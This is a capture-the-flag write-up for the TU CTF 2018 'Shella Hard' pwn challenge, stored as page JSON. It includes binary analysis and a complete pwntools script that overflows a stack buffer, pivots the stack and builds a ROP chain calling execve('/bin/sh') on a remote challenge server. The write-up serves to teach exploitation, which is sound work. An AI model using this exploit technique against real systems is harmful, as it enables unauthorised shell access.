{"pageContext":{"html":"<p><a href=\"ctf=tu-ctf-2018\"></a>\n<a href=\"type=pwn\"></a>\n<a href=\"tags=stack-pivot,buffer-overflow,rop\"></a>\n<a href=\"tools=radare2,gdb-peda,pwntools,python\"></a></p>\n<h1>Shella Hard</h1>\n<p>We are given a <a href=\"/shella-hard-f6f23c1c36cd19a80b6c51b30f601fed.\">binary</a> with <code>NX</code> enabled and a stack based buffer overflow.</p>\n<pre><code class=\"language-bash\">vagrant@amy:~/share/shella_hard$ file shella-hard\nshella-hard: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=4bf12a273afc940e93699d77a19496b781e88246, not stripped\n</code></pre>\n<pre><code class=\"language-bash\">gdb-peda$ checksec\nCANARY    : disabled\nFORTIFY   : disabled\nNX        : ENABLED\nPIE       : disabled\nRELRO     : Partial\n</code></pre>\n<p>The binary has <code>execve</code> in the binary's GOT which allows us to easily create a ROP chain to get a shell.</p>\n<pre><code class=\"language-bash\">vagrant@amy:~/share/shella_hard$ objdump -R shella-hard\n\nshella-hard:     file format elf32-i386\n\nDYNAMIC RELOCATION RECORDS\nOFFSET   TYPE              VALUE\n08049ffc R_386_GLOB_DAT    __gmon_start__\n0804a00c R_386_JUMP_SLOT   read@GLIBC_2.0\n0804a010 R_386_JUMP_SLOT   __libc_start_main@GLIBC_2.0\n0804a014 R_386_JUMP_SLOT   execve@GLIBC_2.0\n</code></pre>\n<p>The initial read is too small for a ROP chain and therefore we have to retun to <code>read</code> and write our ROP chain using a stack pivot. Any 'rw-' section of the binary can be used for storing the ROP chain.</p>\n<pre><code class=\"language-python\">from pwn import *\n\ncontext(arch='i386', os='linux')\n# p = process('./shella-hard')\np = remote('3.16.169.157', 12345)\n\nexecve = 0x08048320\ncmd = 0x8048500 # /bin/sh\nstack = 0x0804a000 + 600 # rw- + stack space. it's\n# crashing in ld.so for some reason if stack space is small\nread_main = 0x08048443 # lea eax, ebp-0x10\n\npayload = ''\npayload += 'a' * 0x10\npayload += p32(stack) # overwrites ebp\npayload += p32(read_main)\npayload += p32(100)\n\np.sendline(payload)\n\npayload = ''\npayload += 'a' * 0x10\npayload += 'a' * 4\npayload += p32(execve)\npayload += 'a' * 4\npayload += p32(cmd)\npayload += p32(0x0)\npayload += p32(0x0)\n\np.sendline(payload)\np.interactive()\n</code></pre>\n<p>Flag</p>\n<blockquote>\n<p>TUCTF{175<em>wh475</em>1n51d3<em>7h47</em>c0un75}</p>\n</blockquote>"}}